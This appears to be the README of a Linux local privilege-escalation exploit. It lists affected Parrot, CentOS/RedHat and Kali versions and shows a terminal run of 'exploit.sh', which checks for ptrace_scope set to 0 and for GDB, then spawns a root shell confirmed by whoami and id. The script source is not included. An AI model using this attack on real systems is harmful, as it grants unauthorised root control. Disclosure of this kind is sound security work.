## 受影响系统:
Parrot Home/Workstation    4.6 (Latest Version)  
Parrot Security            4.6 (Latest Version)  
CentOS / RedHat            7.6 (Latest Version)  
Kali Linux              2018.4 (Latest Version)  

## 提权过程
```shell script
┌─[s4vitar@parrot]─[~/Desktop/Exploit/Privesc]
└──╼ $./exploit.sh

[*] Checking if 'ptrace_scope' is set to 0... [√]
[*] Checking if 'GDB' is installed...         [√]
[*] System seems vulnerable!                  [√]

[*] Starting attack...
[*] PID -> sh
[*] Path 824: /home/s4vitar
[*] PID -> bash
[*] Path 832: /home/s4vitar/Desktop/Exploit/Privesc
[*] PID -> sh
[*] Path
[*] PID -> sh
[*] Path
[*] PID -> sh
[*] Path
[*] PID -> sh
[*] Path
[*] PID -> bash
[*] Path 1816: /home/s4vitar/Desktop/Exploit/Privesc
[*] PID -> bash
[*] Path 1842: /home/s4vitar
[*] PID -> bash
[*] Path 1852: /home/s4vitar/Desktop/Exploit/Privesc
[*] PID -> bash
[*] Path 1857: /home/s4vitar/Desktop/Exploit/Privesc

[*] Cleaning up...                            [√]
[*] Spawning root shell...                    [√]

bash-4.4# whoami
root
bash-4.4# id
uid=1000(s4vitar) gid=1000(s4vitar) euid=0(root) egid=0(root) grupos=0(root),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(debian-tor),124(bluetooth),136(scanner),1000(s4vitar)
bash-4.4#
```